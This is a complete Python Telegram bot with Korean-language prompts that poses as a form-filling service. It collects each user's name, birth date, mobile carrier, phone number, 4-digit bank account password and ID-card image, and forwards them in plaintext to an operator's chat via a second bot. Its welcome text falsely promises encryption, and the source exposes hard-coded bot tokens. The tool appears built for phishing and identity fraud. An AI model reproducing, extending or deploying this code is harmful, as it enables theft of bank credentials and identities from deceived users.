#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
사용자용 양식 작성 봇 (개선 버전 v2)
- 버튼 기반 인터페이스
- 단일 메시지 업데이트 방식
"""

import os
import re
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# 봇 토큰 설정
USER_BOT_TOKEN = "8318680786:AAFCMQ9JZg-YwRJPtIF2bQxI1hRS02-VF9c"
ADMIN_BOT_TOKEN = "8425398865:AAFEIeruD3c56zscnOClp9qNr-a6WzlBCfk"
ADMIN_CHAT_ID = "1025654755"

# 대화 상태 정의
WAITING_INPUT = 1

# 전화번호 중복 체크용
submitted_phones = set()

# 안전한 메시지 수정 함수
async def safe_edit_message(context, chat_id, message_id, text, reply_markup=None):
    """메시지 수정 시 에러를 무시하는 헬퍼 함수"""
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup
        )
    except Exception:
        # 메시지가 동일하거나 기타 에러 발생 시 무시
        pass

# 진행 상황 표시 함수
def get_progress_bar(current_step, total_steps=6):
    """진행 상황을 시각적으로 표시"""
    filled = "■" * current_step
    empty = "□" * (total_steps - current_step)
    percentage = int((current_step / total_steps) * 100)
    return f"[{filled}{empty}] {percentage}% ({current_step}/{total_steps})"

# 현재 상태 메시지 생성
def get_status_message(context):
    """현재 수집된 정보를 포함한 상태 메시지 생성"""
    data = context.user_data
    current_field = data.get('current_field', 'privacy')
    
    # 진행률 계산
    fields = ['privacy', 'name', 'birth', 'carrier', 'phone', 'password', 'id_card', 'message']
    current_index = fields.index(current_field) if current_field in fields else 0
    progress = get_progress_bar(current_index, len(fields))
    
    # 메시지 구성
    message = f"{progress}\n\n"
    message += "📋 양식 작성 현황\n"
    message += "━━━━━━━━━━━━━━━━━━━━\n\n"
    
    # 수집된 정보 표시
    if data.get('privacy_agreed'):
        message += "✅ 개인정보 동의\n"
    
    if data.get('name'):
        message += f"✅ 이름: {data['name']}\n"
    
    if data.get('birth'):
        birth_date = datetime.strptime(data['birth'], '%Y-%m-%d')
        age = (datetime.now() - birth_date).days // 365
        message += f"✅ 생년월일: {data['birth']} (만 {age}세)\n"
    
    if data.get('carrier'):
        message += f"✅ 통신사: {data['carrier']}\n"
    
    if data.get('phone'):
        message += f"✅ 전화번호: {data['phone']}\n"
    
    if data.get('password'):
        message += f"✅ 계좌 비밀번호: {'*' * len(data['password'])}\n"
    
    if data.get('id_card_file'):
        message += f"✅ 신분증: 업로드 완료\n"
    
    if data.get('admin_message'):
        message += f"✅ 관리자 메시지: {data['admin_message'][:30]}{'...' if len(data['admin_message']) > 30 else ''}\n"
    
    message += "\n━━━━━━━━━━━━━━━━━━━━\n\n"
    
    # 다음 단계 안내
    field_instructions = {
        'privacy': '🔒 개인정보 수집 및 이용 동의가 필요합니다.',
        'name': '👤 이름을 입력해주세요.\n💡 예시: 홍길동',
        'birth': '📅 생년월일을 입력해주세요.\n💡 형식: YYYY-MM-DD (예: 1990-03-21)',
        'carrier': '📱 통신사를 선택해주세요.',
        'phone': '📞 전화번호를 입력해주세요.\n💡 형식: 010-XXXX-XXXX (예: 010-1234-5678)',
        'password': '🔐 계좌 비밀번호를 입력해주세요.\n💡 4자리 숫자 (예: 1234)',
        'id_card': '🪪 신분증 사진 또는 파일을 업로드해주세요.\n💡 JPG, PNG, PDF 형식, 20MB 이하',
        'message': '💬 관리자에게 전달할 메시지가 있으면 입력해주세요.\n(선택사항)',
        'confirm': '📝 입력하신 정보를 확인해주세요.'
    }
    
    message += field_instructions.get(current_field, '')
    
    return message

# 버튼 생성
def get_buttons(context):
    """현재 상태에 맞는 버튼 생성"""
    current_field = context.user_data.get('current_field', 'privacy')
    
    if current_field == 'privacy':
        # 개인정보 동의 버튼
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ 동의", callback_data="privacy_agree")],
            [InlineKeyboardButton("❌ 취소", callback_data="privacy_cancel")]
        ])
    
    elif current_field == 'carrier':
        # 통신사 선택 버튼
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("SKT", callback_data="carrier_SKT"),
             InlineKeyboardButton("KT", callback_data="carrier_KT")],
            [InlineKeyboardButton("LG U+", callback_data="carrier_LG U+"),
             InlineKeyboardButton("알뜰 SKT", callback_data="carrier_알뜰 SKT")],
            [InlineKeyboardButton("알뜰 KT", callback_data="carrier_알뜰 KT"),
             InlineKeyboardButton("알뜰 LG", callback_data="carrier_알뜰 LG")]
        ])
    
    elif current_field == 'message':
        # 메시지 입력 스킵 버튼
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("⏭️ 건너뛰기", callback_data="skip_message")]
        ])
    
    elif current_field == 'confirm':
        # 최종 확인 버튼
        keyboard = []
        
        # 수정 버튼들
        edit_buttons = []
        if context.user_data.get('name'):
            edit_buttons.append(InlineKeyboardButton("이름", callback_data="edit_name"))
        if context.user_data.get('birth'):
            edit_buttons.append(InlineKeyboardButton("생년월일", callback_data="edit_birth"))
        
        if edit_buttons:
            keyboard.append(edit_buttons)
        
        edit_buttons = []
        if context.user_data.get('carrier'):
            edit_buttons.append(InlineKeyboardButton("통신사", callback_data="edit_carrier"))
        if context.user_data.get('phone'):
            edit_buttons.append(InlineKeyboardButton("전화번호", callback_data="edit_phone"))
        
        if edit_buttons:
            keyboard.append(edit_buttons)
        
        edit_buttons = []
        if context.user_data.get('password'):
            edit_buttons.append(InlineKeyboardButton("비밀번호", callback_data="edit_password"))
        if context.user_data.get('id_card_file_id'):
            edit_buttons.append(InlineKeyboardButton("신분증", callback_data="edit_id_card"))
        
        if edit_buttons:
            keyboard.append(edit_buttons)
        
        if context.user_data.get('admin_message'):
            keyboard.append([InlineKeyboardButton("메시지", callback_data="edit_message")])
        
        # 전송 및 취소 버튼
        keyboard.append([InlineKeyboardButton("✅ 전송하기", callback_data="submit")])
        keyboard.append([InlineKeyboardButton("❌ 취소", callback_data="cancel")])
        
        return InlineKeyboardMarkup(keyboard)
    
    return None

# /start 명령어 핸들러
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """봇 시작"""
    context.user_data.clear()
    context.user_data['current_field'] = 'privacy'
    
    welcome_message = (
        "👋 환영합니다!\n\n"
        "📋 양식 작성 안내\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⏱ 소요 시간: 약 2-3분\n"
        "📱 준비물: 신분증 사진\n"
        "🔐 보안: 모든 정보는 암호화되어 전송됩니다\n\n"
        "💡 도움말: /help\n"
        "💡 취소: /cancel\n\n"
    )
    
    privacy_policy = (
        "🔒 개인정보 보호 방침\n\n"
        "📌 수집 항목\n"
        "- 이름, 생년월일, 전화번호, 통신사\n"
        "- 계좌 비밀번호, 신분증 사진\n\n"
        "📌 이용 목적\n"
        "- 본인 확인 및 서비스 제공\n\n"
        "📌 보유 기간\n"
        "- 처리 완료 후 30일 이내 파기\n\n"
        "📌 귀하의 권리\n"
        "- 언제든지 제출 취소 가능 (/cancel)\n"
        "- 개인정보 열람/수정/삭제 요청 가능\n"
    )
    
    message = await update.message.reply_text(
        welcome_message + privacy_policy + "\n━━━━━━━━━━━━━━━━━━━━\n\n" + 
        get_status_message(context),
        reply_markup=get_buttons(context)
    )
    
    # 메시지 ID 저장 (업데이트용)
    context.user_data['main_message_id'] = message.message_id
    
    return WAITING_INPUT

# 버튼 콜백 핸들러
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """모든 버튼 클릭 처리"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    # 개인정보 동의
    if data == "privacy_agree":
        context.user_data['privacy_agreed'] = True
        context.user_data['current_field'] = 'name'
        
        try:
            await query.edit_message_text(
            get_status_message(context),
            reply_markup=get_buttons(context)
            )
        except Exception:
            pass
        return WAITING_INPUT
    
    elif data == "privacy_cancel":
        try:
            await query.edit_message_text(
            "❌ 개인정보 수집에 동의하지 않으셨습니다.\n"
            "양식 작성이 취소되었습니다.\n\n"
            "다시 시작하려면 /start를 입력해주세요."
            )
        except Exception:
            pass
        context.user_data.clear()
        return ConversationHandler.END
    
    # 통신사 선택
    elif data.startswith("carrier_"):
        carrier = data.replace("carrier_", "")
        context.user_data['carrier'] = carrier
        
        # 수정 모드인 경우 확인 단계로 바로 복귀
        if context.user_data.get('editing'):
            context.user_data.pop('editing', None)
            context.user_data['current_field'] = 'confirm'
        else:
            context.user_data['current_field'] = 'phone'
        
        try:
            await query.edit_message_text(
            get_status_message(context),
            reply_markup=get_buttons(context)
            )
        except Exception:
            pass
        return WAITING_INPUT
    
    # 메시지 건너뛰기
    elif data == "skip_message":
        context.user_data['current_field'] = 'confirm'
        
        try:
            await query.edit_message_text(
            get_status_message(context),
            reply_markup=get_buttons(context)
            )
        except Exception:
            pass
        return WAITING_INPUT
    
    # 수정 버튼들
    elif data.startswith("edit_"):
        field = data.replace("edit_", "")
        context.user_data['current_field'] = field
        context.user_data['editing'] = True
        
        try:
            await query.edit_message_text(
            get_status_message(context),
            reply_markup=get_buttons(context)
            )
        except Exception:
            pass
        return WAITING_INPUT
    
    # 전송
    elif data == "submit":
        return await submit_to_admin(update, context)
    
    # 취소
    elif data == "cancel":
        try:
            await query.edit_message_text(
            "❌ 제출이 취소되었습니다.\n\n"
            "입력하신 모든 정보는 저장되지 않았습니다.\n\n"
            "처음부터 다시 시작하려면 /start 명령어를 입력해주세요."
            )
        except Exception:
            pass
        context.user_data.clear()
        return ConversationHandler.END
    
    return WAITING_INPUT

# 텍스트 입력 핸들러
async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """텍스트 입력 처리"""
    text = update.message.text.strip()
    current_field = context.user_data.get('current_field')
    main_message_id = context.user_data.get('main_message_id')
    
    # 입력 메시지 삭제
    try:
        await update.message.delete()
    except:
        pass
    
    # 이름 입력
    if current_field == 'name':
        # 이름 유효성 검사
        if len(text) < 2:
            error_msg = get_status_message(context) + "\n\n❌ 이름이 너무 짧습니다. (2자 이상)"
            try:
                await safe_edit_message(context, 
                    update.effective_chat.id,
                    main_message_id,
                    text=error_msg,
                    reply_markup=get_buttons(context)
                )
            except Exception:
                pass  # 메시지가 동일하면 무시
            return WAITING_INPUT
        
        if len(text) > 20:
            error_msg = get_status_message(context) + "\n\n❌ 이름이 너무 깁니다. (20자 이하)"
            try:
                await safe_edit_message(context, 
                    update.effective_chat.id,
                    main_message_id,
                    text=error_msg,
                    reply_markup=get_buttons(context)
                )
            except Exception:
                pass
            return WAITING_INPUT
        
        if re.search(r'[!@#$%^&*(),.?":{}|<>]', text):
            error_msg = get_status_message(context) + "\n\n❌ 이름에 특수문자를 사용할 수 없습니다."
            try:
                await safe_edit_message(context, 
                    update.effective_chat.id,
                    main_message_id,
                    text=error_msg,
                    reply_markup=get_buttons(context)
                )
            except Exception:
                pass
            return WAITING_INPUT
        
        context.user_data['name'] = text
        
        # 수정 모드인 경우 확인 단계로 바로 복귀
        if context.user_data.get('editing'):
            context.user_data.pop('editing', None)
            context.user_data['current_field'] = 'confirm'
        else:
            context.user_data['current_field'] = 'birth'
        
        try:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context),
                reply_markup=get_buttons(context)
            )
        except Exception:
            pass
        return WAITING_INPUT
    
    # 생년월일 입력
    elif current_field == 'birth':
        # 날짜 형식 검증
        if not re.match(r'^\d{4}-\d{2}-\d{2}$', text):
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 올바른 형식이 아닙니다. (YYYY-MM-DD)",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        # 실제 날짜 유효성 검증
        try:
            birth_date = datetime.strptime(text, '%Y-%m-%d')
        except ValueError:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 유효하지 않은 날짜입니다.",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        # 미래 날짜 검증
        if birth_date > datetime.now():
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 미래 날짜는 입력할 수 없습니다.",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        # 나이 계산
        age = (datetime.now() - birth_date).days // 365
        if age < 19:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=f"❌ 만 19세 이상만 신청 가능합니다.\n\n"
                     f"입력하신 생년월일: {text}\n"
                     f"계산된 나이: 만 {age}세\n\n"
                     "양식 작성이 취소됩니다."
            )
            context.user_data.clear()
            return ConversationHandler.END
        
        if age > 100:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 생년월일을 다시 확인해주세요.",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        context.user_data['birth'] = text
        
        # 수정 모드인 경우 확인 단계로 바로 복귀
        if context.user_data.get('editing'):
            context.user_data.pop('editing', None)
            context.user_data['current_field'] = 'confirm'
        else:
            context.user_data['current_field'] = 'carrier'
        
        await safe_edit_message(context, 
            update.effective_chat.id,
            main_message_id,
            text=get_status_message(context),
            reply_markup=get_buttons(context)
        )
        return WAITING_INPUT
    
    # 전화번호 입력
    elif current_field == 'phone':
        # 전화번호 형식 검증
        if not re.match(r'^010-\d{4}-\d{4}$', text):
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 올바른 형식이 아닙니다. (010-XXXX-XXXX)",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        # 중복 확인
        if text in submitted_phones:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 이미 등록된 전화번호입니다.",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        context.user_data['phone'] = text
        
        # 수정 모드인 경우 확인 단계로 바로 복귀
        if context.user_data.get('editing'):
            context.user_data.pop('editing', None)
            context.user_data['current_field'] = 'confirm'
        else:
            context.user_data['current_field'] = 'password'
        
        await safe_edit_message(context, 
            update.effective_chat.id,
            main_message_id,
            text=get_status_message(context),
            reply_markup=get_buttons(context)
        )
        return WAITING_INPUT
    
    # 비밀번호 입력
    elif current_field == 'password':
        # 비밀번호 검증 (4자리 숫자)
        if not re.match(r'^\d{4}$', text):
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 4자리 숫자를 입력해주세요.",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        context.user_data['password'] = text
        
        # 수정 모드인 경우 확인 단계로 바로 복귀
        if context.user_data.get('editing'):
            context.user_data.pop('editing', None)
            context.user_data['current_field'] = 'confirm'
        else:
            context.user_data['current_field'] = 'id_card'
        
        await safe_edit_message(context, 
            update.effective_chat.id,
            main_message_id,
            text=get_status_message(context),
            reply_markup=get_buttons(context)
        )
        return WAITING_INPUT
    
    # 관리자 메시지 입력
    elif current_field == 'message':
        if len(text) > 500:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ 메시지가 너무 깁니다. (500자 이하)",
                reply_markup=get_buttons(context)
            )
            return WAITING_INPUT
        
        context.user_data['admin_message'] = text
        context.user_data.pop('editing', None)  # 항상 수정 모드 종료
        context.user_data['current_field'] = 'confirm'
        
        await safe_edit_message(context, 
            update.effective_chat.id,
            main_message_id,
            text=get_status_message(context),
            reply_markup=get_buttons(context)
        )
        return WAITING_INPUT
    
    return WAITING_INPUT

# 파일 업로드 핸들러
async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """파일 업로드 처리 (사진 또는 문서)"""
    current_field = context.user_data.get('current_field')
    main_message_id = context.user_data.get('main_message_id')
    
    if current_field != 'id_card':
        # 신분증 업로드 단계가 아니면 무시
        try:
            await update.message.delete()
        except:
            pass
        return WAITING_INPUT
    
    # 파일 정보 저장
    if update.message.photo:
        # 사진인 경우 (가장 큰 사이즈 선택)
        photo = update.message.photo[-1]
        file_id = photo.file_id
        file_type = 'photo'
        file_size = photo.file_size
        
        # 파일 객체 자체를 저장 (봇 간 file_id 호환성 문제 해결)
        file = await context.bot.get_file(file_id)
        context.user_data['id_card_file'] = file
        
    elif update.message.document:
        # 문서인 경우
        document = update.message.document
        file_id = document.file_id
        file_type = 'document'
        file_size = document.file_size
        mime_type = document.mime_type
        
        # 파일 형식 검증
        allowed_types = ['image/jpeg', 'image/png', 'application/pdf']
        if mime_type not in allowed_types:
            await safe_edit_message(context, 
                update.effective_chat.id,
                main_message_id,
                text=get_status_message(context) + "\n\n❌ JPG, PNG, PDF 형식만 가능합니다.",
                reply_markup=get_buttons(context)
            )
            try:
                await update.message.delete()
            except:
                pass
            return WAITING_INPUT
        
        # 파일 객체 자체를 저장
        file = await context.bot.get_file(file_id)
        context.user_data['id_card_file'] = file
    else:
        try:
            await update.message.delete()
        except:
            pass
        return WAITING_INPUT
    
    # 파일 크기 검증 (20MB)
    if file_size > 20 * 1024 * 1024:
        await safe_edit_message(context, 
            update.effective_chat.id,
            main_message_id,
            text=get_status_message(context) + "\n\n❌ 파일 크기는 20MB 이하여야 합니다.",
            reply_markup=get_buttons(context)
        )
        try:
            await update.message.delete()
        except:
            pass
        return WAITING_INPUT
    
    # 파일 정보 저장
    context.user_data['id_card_file_id'] = file_id
    context.user_data['id_card_type'] = file_type
    
    # 수정 모드인 경우 확인 단계로 바로 복귀
    if context.user_data.get('editing'):
        context.user_data.pop('editing', None)
        context.user_data['current_field'] = 'confirm'
    else:
        context.user_data['current_field'] = 'message'
    
    # 업로드한 메시지 삭제
    try:
        await update.message.delete()
    except:
        pass
    
    await safe_edit_message(context, 
        update.effective_chat.id,
        main_message_id,
        text=get_status_message(context),
        reply_markup=get_buttons(context)
    )
    return WAITING_INPUT

# 관리자 봇으로 전송
async def submit_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """수집한 데이터를 관리자 봇으로 전송"""
    query = update.callback_query
    await query.answer("전송 중입니다...")
    
    data = context.user_data
    user = query.from_user
    
    # 필수 항목 확인
    required_fields = ['name', 'birth', 'carrier', 'phone', 'password', 'id_card_file']
    for field in required_fields:
        if not data.get(field):
            try:
                await query.edit_message_text(
                get_status_message(context) + "\n\n❌ 필수 정보가 누락되었습니다.",
                reply_markup=get_buttons(context)
                )
            except Exception:
                pass
            return WAITING_INPUT
    
    # 관리자 봇 인스턴스 생성
    admin_bot = Bot(token=ADMIN_BOT_TOKEN)
    
    # 제출 ID 생성
    submission_id = f"SUB_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{user.id}"
    
    # 전화번호를 제출 완료 목록에 추가
    submitted_phones.add(data.get('phone'))
    
    # 관리자에게 보낼 메시지 포맷팅
    admin_message = (
        f"🆕 새로운 양식 제출\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 제출 ID: {submission_id}\n"
        f"👤 이름: {data.get('name', '')}\n"
        f"📅 생년월일: {data.get('birth', '')}\n"
        f"📱 통신사: {data.get('carrier', '')}\n"
        f"📞 전화번호: {data.get('phone', '')}\n"
        f"🔐 계좌 비밀번호: {data.get('password', '')}\n"
        f"💬 관리자 메시지: {data.get('admin_message', '없음')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 제출자 정보\n"
        f"사용자 ID: {user.id}\n"
        f"이름: {user.first_name} {user.last_name or ''}\n"
        f"사용자명: @{user.username or '없음'}\n"
        f"제출 시각: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    try:
        # 관리자 봇을 통해 관리자에게 텍스트 정보 전송
        await admin_bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_message
        )
        
        # 신분증 파일 전송
        file_obj = data.get('id_card_file')
        file_type = data.get('id_card_type')
        
        if file_obj:
            # 파일을 다운로드해서 전송
            file_path = await file_obj.download_to_drive()
            
            if file_type == 'photo':
                with open(file_path, 'rb') as f:
                    await admin_bot.send_photo(
                        chat_id=ADMIN_CHAT_ID,
                        photo=f,
                        caption=f"🪪 신분증 사진 (제출 ID: {submission_id})"
                    )
            elif file_type == 'document':
                with open(file_path, 'rb') as f:
                    await admin_bot.send_document(
                        chat_id=ADMIN_CHAT_ID,
                        document=f,
                        caption=f"🪪 신분증 파일 (제출 ID: {submission_id})"
                    )
            
            # 임시 파일 삭제
            try:
                import os
                os.remove(file_path)
            except:
                pass
        
        # 사용자에게 완료 메시지
        try:
            await query.edit_message_text(
            "✅ 제출이 완료되었습니다!\n\n"
            f"📋 접수번호: {submission_id}\n"
            f"📅 제출일시: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "관리자가 확인 후 연락드리겠습니다.\n"
            "접수번호를 기억해두시면 문의 시 도움이 됩니다.\n\n"
            "감사합니다. 😊"
            )
        except Exception:
            pass
        
    except Exception as e:
        # 전송 실패 시 전화번호 목록에서 제거
        submitted_phones.discard(data.get('phone'))
        
        try:
            await query.edit_message_text(
            "❌ 전송 중 오류가 발생했습니다.\n\n"
            f"오류 내용: {str(e)}\n\n"
            "잠시 후 다시 시도해주시거나\n"
            "관리자에게 문의해주세요.\n\n"
            "다시 시작하려면 /start 명령어를 입력해주세요."
            )
        except Exception:
            pass
    
    # 사용자 데이터 초기화
    context.user_data.clear()
    return ConversationHandler.END

# 대화 취소
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """대화 중단"""
    await update.message.reply_text(
        "❌ 작업이 취소되었습니다.\n\n"
        "입력하신 모든 정보는 저장되지 않았습니다.\n\n"
        "처음부터 다시 시작하려면 /start 명령어를 입력해주세요."
    )
    
    context.user_data.clear()
    return ConversationHandler.END

# /help 명령어
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """도움말"""
    help_text = (
        "📖 도움말\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 사용 가능한 명령어:\n\n"
        "/start - 양식 작성 시작\n"
        "/help - 이 도움말 보기\n"
        "/cancel - 현재 작성 취소\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "❓ 자주 묻는 질문:\n\n"
        "Q: 작성 중 실수했어요\n"
        "A: 최종 확인 단계에서 각 항목을 수정할 수 있습니다\n\n"
        "Q: 제출 후 수정 가능한가요?\n"
        "A: 관리자에게 문의해주세요\n\n"
        "Q: 신분증이 업로드 안 돼요\n"
        "A: JPG, PNG, PDF 형식으로 20MB 이하 파일을 업로드해주세요\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 개선된 기능:\n"
        "• 버튼으로 간편하게 선택\n"
        "• 하나의 메시지로 전체 과정 진행\n"
        "• 실시간 진행률 표시\n"
    )
    
    await update.message.reply_text(help_text)

def main():
    """봇 실행"""
    application = Application.builder().token(USER_BOT_TOKEN).build()
    
    # ConversationHandler 설정
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            WAITING_INPUT: [
                CallbackQueryHandler(button_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input),
                MessageHandler(filters.PHOTO, handle_file_upload),
                MessageHandler(filters.Document.ALL, handle_file_upload),
            ],
        },
        fallbacks=[
            CommandHandler('cancel', cancel),
            CommandHandler('help', help_command)
        ],
        per_message=False,
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('help', help_command))
    
    print("🤖 사용자 양식 작성 봇이 시작되었습니다...")
    print(f"📤 관리자 봇으로 직접 전송 모드 (Chat ID: {ADMIN_CHAT_ID})")
    print("✨ 개선사항:")
    print("   - 버튼 기반 인터페이스")
    print("   - 단일 메시지 업데이트 방식")
    print("   - 실시간 진행률 표시")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()